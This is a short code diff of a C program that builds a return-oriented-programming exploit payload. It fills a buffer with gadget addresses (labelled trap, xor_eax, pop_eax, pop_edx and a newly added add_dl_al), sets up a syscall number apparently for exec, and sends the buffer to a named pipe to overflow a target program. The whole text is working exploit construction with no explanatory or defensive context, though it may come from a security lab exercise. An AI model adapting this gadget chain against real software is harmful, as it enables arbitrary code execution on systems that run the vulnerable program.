@@ -7,13 +7,14 @@
 
 int main(void)
 {
-  char bufr[143];
+  char bufr[146];
   char trap[] = "\xe5\xb6\xa9\xbb";
   char xor_eax[] = "\xc2\xb3\xa9\xbb";
   char pop_eax[] = "\xe1\xa0\xb9\xbb";
   char pop_edx[] = "\x1b\xdc\xb9\xbb";
+  char add_dl_al[] = "\x07\x46\xbb\xbb";
 
-  char exec_arg[] = "\x01\x01\x01\x3b";
+  char exec_arg[] = "\x3b\x01\x01\x01";
 
   int i;
   // Fill up buffer
@@ -26,6 +27,8 @@ int main(void)
   strcpy(bufr + 135, exec_arg);
   // clear eax
   strcpy(bufr + 139, xor_eax);  
+  // add last 8 bits of edx to eax
+  strcpy(bufr + 143, add_dl_al);  
 
   writecmd(PIPEPATH, bufr);
   
